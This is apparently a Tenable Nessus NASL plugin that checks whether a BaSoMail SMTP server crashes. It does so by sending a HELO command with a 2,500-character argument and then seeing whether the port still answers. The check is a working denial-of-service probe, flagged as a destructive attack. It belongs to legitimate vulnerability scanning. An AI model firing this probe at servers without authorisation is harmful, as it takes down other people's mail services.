#
# (C) Tenable Network Security, Inc.
#
# Use imate_overflow.nasl as a template (Covered by csm_helo.nasl too, should merge?)
#


include("compat.inc");


if(description)
{
 script_id(11674);
 script_bugtraq_id(7726);
 script_xref(name:"OSVDB", value:"50541");
 script_version ("$Revision: 1.11 $");
 script_name(english:"BaSoMail SMTP Multiple Command Remote Overflow DoS");
 script_summary(english:"Checks if the remote mail server can be oveflown");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote SMTP server has multiple buffer overflow vulnerabilities."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote SMTP server crashes when it is issued a HELO, MAIL FROM, or\n",
     "RCPT TO command with an argument longer than 2100 characters.  A\n",
     "remote attacker could exploit this by crashing the server, or possibly\n",
     "executing arbitrary code.\n\n",
     "It is likely the remote SMTP server is running BaSoMail, though other\n",
     "products may be affected as well."
   )
 );
 script_set_attribute(
   attribute:"see_also", 
   value:"http://securitytracker.com/alerts/2003/May/1006863.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:string(
     "If the SMTP server is BaSoMail, consider using a different product, as\n",     "it has not been actively maintained for several years.  Otherwise,\n",
     "upgrade to the latest version of the SMTP server."
   )
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"SMTP problems");
 
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 
 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);

 exit(0);
}
#
# The script code starts here
#
include("global_settings.inc");
include("smtp_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
 s = smtp_recv_banner(socket:soc);
 if(!s)exit(0);
 if(!egrep(pattern:"^220 .*", string:s))
 {
   close(soc);
   exit(0);
 }
 
 crp = string("HELO ", crap(2500), "\r\n");
 send(socket:soc, data:crp);
 data = recv_line(socket:soc, length:4);
 close(soc);
 
 
 soc2 = open_sock_tcp(port);
 if(!soc2)security_hole(port);
 }
}
